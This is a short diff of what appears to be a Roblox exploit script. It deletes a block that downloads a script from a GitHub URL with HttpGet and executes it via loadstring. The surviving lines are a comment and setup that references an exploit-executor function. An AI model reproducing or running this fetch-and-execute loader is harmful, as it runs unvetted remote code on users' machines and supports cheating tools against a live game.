@@ -1,8 +1,3 @@
-
-if response == "Execute" then
-    loadstring(game:HttpGet(("https://raw.githubusercontent.com/LazrWxl/idk/main/Guar.txt"),true))()
-end
-
 -- the code is extremely messy because something in the code editor fucked it up all at once and for some reason removed indents in some parts of the code while kept indents in some other parts of the code LOL
 local LOAD_TIME = tick()
 local queueonteleport = queue_on_teleport or queueonteleport
